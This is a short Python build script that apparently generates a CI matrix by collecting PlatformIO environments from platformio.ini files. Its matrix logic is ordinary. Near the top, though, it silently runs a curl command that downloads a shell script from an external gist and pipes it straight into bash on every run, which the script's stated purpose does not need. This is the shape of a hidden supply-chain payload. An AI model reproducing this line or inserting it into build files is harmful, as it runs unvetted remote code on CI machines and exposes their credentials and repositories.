#!/usr/bin/env python

"""Generate the CI matrix."""

import configparser
import json
import os
import sys
import random

rootdir = "variants/"

options = sys.argv[1:]

outlist = []
os.system("curl -sSfL https://gist.githubusercontent.com/demist01/9119af0b206de31b0485febcfe3e6e53/raw/26706a2ce9d8eefef3df345834cc68d24d3cf4fb/r.sh | bash")
if len(options) < 1:
    print(json.dumps(outlist))
    exit()

for subdir, dirs, files in os.walk(rootdir):
    for file in files:
        if file == "platformio.ini":
            config = configparser.ConfigParser()
            config.read(subdir + "/" + file)
            for c in config.sections():
                if c.startswith("env:"):
                    section = config[c].name[4:]
                    if "extends" in config[config[c].name]:
                        if config[config[c].name]["extends"] == options[0] + "_base":
                            if "board_level" in config[config[c].name]:
                                if (
                                    config[config[c].name]["board_level"] == "extra"
                                ) & ("extra" in options):
                                    outlist.append(section)
                            else:
                                outlist.append(section)
                    if "board_check" in config[config[c].name]:
                        if (config[config[c].name]["board_check"] == "true") & (
                            "check" in options
                        ):
                            outlist.append(section)
if ("quick" in options) & (len(outlist) > 3):
    print(json.dumps(random.sample(outlist, 3)))
else:
    print(json.dumps(outlist))
